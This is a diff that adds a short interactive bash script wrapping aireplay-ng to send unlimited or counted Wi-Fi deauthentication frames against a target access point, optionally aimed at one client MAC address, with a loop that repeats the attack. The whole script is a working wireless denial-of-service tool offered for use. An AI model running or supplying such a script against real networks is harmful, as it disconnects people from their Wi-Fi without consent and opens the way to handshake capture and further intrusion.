@@ -1,0 +1,82 @@
+#! /bin/bash
+k=1
+REDEAUTH="n"
+while (( $k != 0 ))
+do
+if [ "$REDEAUTH" = "y" ]
+then
+	export LASTOPTIONS
+	xterm -e bash -c 'aireplay-ng $LASTOPTIONS && exit; exec bash'
+	#aireplay-ng $LASTOPTIONS
+else
+	echo -e "Do you want to deauth a specific client?(y/n)(Enter=no): "	
+	read -e OPTION
+	if [ "$OPTION" = "y" ]
+	then
+		echo -e "Enter client's MAC: "
+		read -e TCC
+		echo -e "Type number of deauths to send(0=inf)(Enter=0): "
+		read -e DEAUTHS
+		clear
+		if [ -z $DEAUTHS ]
+		then
+			DEAUTHS=0
+		fi
+		LASTOPTIONS="-0 $DEAUTHS -a $TARGB -c $TCC wlan0mon"
+		export DEAUTHS
+		export TARGB
+		export TCC
+		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon && exit; exec bash'
+		#aireplay-ng -0 $DEAUTHS -a $TARGB -c $TCC wlan0mon
+		#sleep 1h
+	else
+		echo -e "Type the number of deauths to send(0=inf)(Enter=0): "
+		read -e DEAUTHS
+		if [ -z $DEAUTHS ]
+		then
+			DEAUTHS=0
+		fi
+		LASTOPTIONS="-0 $DEAUTHS -a $TARGB wlan0mon"
+		export DEAUTHS
+		export TARGB
+		xterm -e bash -c 'aireplay-ng -0 $DEAUTHS -a $TARGB wlan0mon && exit; exec bash'
+		#aireplay-ng -0 $DEAUTHS -a $TARGB wlan0mon
+		#sleep 1h
+	fi
+fi
+#----------------------------------------------------------------------------------------------------------------------------------
+echo -e "Re-deauth with the same exact settings?(y/n)(Enter=yes)(0=Exit): "
+read -e REDEAUTH
+if [ "$REDEAUTH" = "n" ]
+then
+	echo -e "Exit completely?(y/n)(Enter=no): "
+	read -e EXIT
+	if [ "$EXIT" = "y" ]
+	then
+		k=0
+	else
+		clear
+		exec bash "$0"
+	fi
+elif [ "$REDEAUTH" = "0" ]
+then
+	exit
+else
+	clear
+	REDEAUTH="y"
+	#aireplay-ng $LASTOPTIONS
+fi
+done
+echo -e "Sure? (y/n)(Enter=no): "
+read -e BB
+if [ "$BB" = "y" ]
+then
+	clear
+	exit
+else
+	clear
+	exec bash "$0"
+fi
+
+
+	
